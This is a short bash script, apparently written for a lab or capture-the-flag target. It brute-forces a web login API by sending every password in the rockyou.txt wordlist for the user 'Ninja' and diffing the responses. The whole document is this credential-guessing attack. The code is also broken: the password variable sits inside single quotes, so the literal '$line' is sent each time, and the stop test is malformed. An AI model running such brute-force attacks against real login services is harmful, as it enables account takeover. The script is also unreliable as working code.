rockyou_path="/usr/share/wordlists/rockyou.txt"

head $rockyou_path

while read line;
do
	echo $line
	curl -X POST -H "Content-Type: application/json" -d '{"username":"Ninja", "password":"$line"}' http://10.10.174.179/api/login > bobo.txt
	diff bobo2.txt bobo.txt
	ret=$?
	if [ ret -eq 0]; then
		break
	fi
done < $rockyou_path
